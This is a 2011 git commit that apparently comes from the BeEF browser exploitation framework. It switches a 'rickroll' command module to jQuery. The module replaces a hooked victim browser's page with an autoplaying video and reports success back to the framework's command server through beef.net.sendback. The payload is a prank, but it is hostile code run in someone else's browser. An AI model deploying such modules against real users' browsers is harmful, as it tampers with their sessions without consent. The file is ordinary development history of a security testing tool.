2a0f342ab1f82d10bfa58289636282b61b8080cf
yori.kvitchko <yori.kvitchko@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-01-05 00:36:01 +0000

    jquery
    git-svn-id: https://beef.googlecode.com/svn/trunk@668 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

--- modules/commands/misc/rickroll/rickroll.js
+++ modules/commands/misc/rickroll/rickroll.js
@@ -1,5 +1,5 @@
 beef.execute(function() {
-	document.body.innerHTML = '<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>';
+	$j('body').html('<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>');
 
     beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Succesfull");
 });
